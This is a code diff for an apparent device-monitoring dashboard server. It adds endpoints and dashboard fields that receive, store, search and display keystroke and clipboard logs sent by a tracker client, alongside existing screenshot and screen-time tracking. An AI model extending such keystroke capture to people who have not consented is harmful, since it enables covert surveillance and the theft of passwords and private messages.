@@ -59,6 +59,7 @@ async def dashboard_view(request: Request):
     recent_alerts = database.get_recent_alerts(device_id, limit=15)
     latest_screenshot = database.get_latest_screenshot(device_id)
     recent_screenshots = database.get_recent_screenshots(device_id, limit=12)
+    recent_keystrokes = database.get_recent_keystroke_logs(device_id, limit=35)
 
     daily_total_limit_mins = int(settings.get("daily_total_limit_minutes", "240"))
     total_sec = summary["total_seconds"]
@@ -114,7 +115,8 @@ async def dashboard_view(request: Request):
         "recent_logs": recent_logs,
         "recent_alerts": recent_alerts,
         "latest_screenshot": latest_screenshot,
-        "recent_screenshots": recent_screenshots
+        "recent_screenshots": recent_screenshots,
+        "recent_keystrokes": recent_keystrokes
     }
     return templates.TemplateResponse(request=request, name="dashboard.html", context=ctx)
 
@@ -127,6 +129,7 @@ async def get_stats():
     weekly_trend = database.get_weekly_trend(device_id)
     settings = database.get_all_settings()
     latest_screenshot = database.get_latest_screenshot(device_id)
+    recent_keystrokes = database.get_recent_keystroke_logs(device_id, limit=20)
 
     return {
         "summary": summary,
@@ -134,6 +137,7 @@ async def get_stats():
         "live_status": live_status,
         "weekly_trend": weekly_trend,
         "latest_screenshot": latest_screenshot,
+        "recent_keystrokes": recent_keystrokes,
         "study_mode": settings.get("study_mode_active", "false").lower() == "true",
         "emergency_lock": settings.get("emergency_lock", "false").lower() == "true"
     }
@@ -340,8 +344,38 @@ async def get_mobile_dashboard():
         "recent_logs": recent_logs,
         "recent_alerts": recent_alerts,
         "latest_screenshot": database.get_latest_screenshot(device_id),
-        "recent_screenshots": database.get_recent_screenshots(device_id, limit=12)
+        "recent_screenshots": database.get_recent_screenshots(device_id, limit=12),
+        "recent_keystrokes": database.get_recent_keystroke_logs(device_id, limit=30)
     }
+
+@app.get("/api/keystrokes")
+async def get_keystrokes_api(limit: int = 50, q: str = None, log_type: str = None):
+    """Fetches recent keystroke and clipboard logs with optional search filtering."""
+    device_id = database.get_device_id(config.DEVICE_NAME)
+    logs = database.get_recent_keystroke_logs(device_id, limit=limit, search_query=q, log_type=log_type)
+    return {"keystrokes": logs}
+
+@app.post("/api/keystrokes")
+async def save_keystroke_api(payload: dict = Body(...)):
+    """Receives single or batch keystroke / clipboard logs from tracker client."""
+    device_name = payload.get("device_name", config.DEVICE_NAME)
+    device_id = database.get_device_id(device_name)
+    batch = payload.get("batch") or payload.get("logs")
+    if batch:
+        count = database.save_keystroke_batch(device_id, batch)
+        return {"success": True, "saved": count}
+    elif "content" in payload:
+        log_id = database.save_keystroke_log(
+            device_id=device_id,
+            process_name=payload.get("process_name", "unknown"),
+            window_title=payload.get("window_title", ""),
+            category_name=payload.get("category_name", "Other"),
+            content=payload.get("content", ""),
+            log_type=payload.get("log_type", "keystroke"),
+            recorded_at=payload.get("recorded_at")
+        )
+        return {"success": True, "id": log_id}
+    return JSONResponse(status_code=400, content={"error": "Invalid keystroke payload"})
 
 @app.post("/api/mobile/rules/save")
 async def save_rule_mobile(payload: dict = Body(...)):
